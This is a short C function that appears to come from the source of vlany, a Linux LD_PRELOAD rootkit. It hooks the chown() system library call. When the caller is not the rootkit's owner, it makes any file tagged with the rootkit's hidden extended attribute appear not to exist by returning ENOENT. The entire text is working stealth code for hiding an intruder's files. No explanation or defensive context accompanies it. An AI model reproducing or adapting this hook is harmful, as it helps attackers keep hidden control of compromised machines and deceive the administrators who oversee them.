int chown(const char *path, uid_t owner, gid_t group)
{
    #ifdef DEBUG
        printf("[vlany] chown() called\n");
    #endif

    HOOK(old_chown, CCHOWN);

    if(owned()) return old_chown(path, owner, group);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_chown(path, owner, group);
}
